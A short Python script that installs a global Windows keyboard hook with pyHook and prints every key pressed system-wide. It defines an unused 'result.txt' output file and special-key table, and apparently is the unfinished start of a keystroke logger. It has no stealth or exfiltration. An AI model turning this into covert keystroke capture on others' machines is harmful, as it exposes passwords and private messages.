import pythoncom, pyHook # for hooking.
import win32api, win32con # for indicate caps state.

SIG_SHIFT = 0
SIG_NEXTLINE = 1
SIG_ERASE = 2

FILE_NAME = "result.txt"


"""
enter : Return
backsapace : Back
tab : Tab
caps : Capital
space : Space
esc : Escape
"""

comb_keys = {
    "Lshift" : SIG_SHIFT,
    "Rshift" : SIG_SHIFT,
    "Tab" : SIG_NEXTLINE,
    "Return" : SIG_NEXTLINE,
    "Space" : SIG_NEXTLINE,
    "Escape" : SIG_NEXTLINE,
    "Back" : SIG_ERASE,
}


def OnKeyboardEvent(event):
    # indicates state of caps lock. 0:lower / 1:upper
    caps_stat = win32api.GetKeyState(win32con.VK_CAPITAL)
    try:
        key = str(event.Key)
        print("Key: ", key)
    except:
        pass

# return True to pass th event to other handlers.
    return True

# create a hook manager.
hm = pyHook.HookManager()
# watch for all events.
hm.KeyDown = OnKeyboardEvent
# set the hook.
hm.HookKeyboard()
# wait forever.
pythoncom.PumpMessages()